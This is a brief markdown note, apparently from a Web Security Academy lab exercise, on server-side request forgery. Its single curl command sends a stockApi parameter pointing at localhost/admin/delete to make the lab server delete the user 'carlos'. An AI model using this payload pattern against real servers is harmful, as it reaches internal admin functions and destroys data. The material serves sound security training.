# SSRF using curl command

### Basic SSRF against Local server

curl -X POST https://0a1c00f803d90a66807ddab000ec00df.web-security-academy.net/product/stock \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "stockApi=http://localhost/admin/delete?username=carlos"

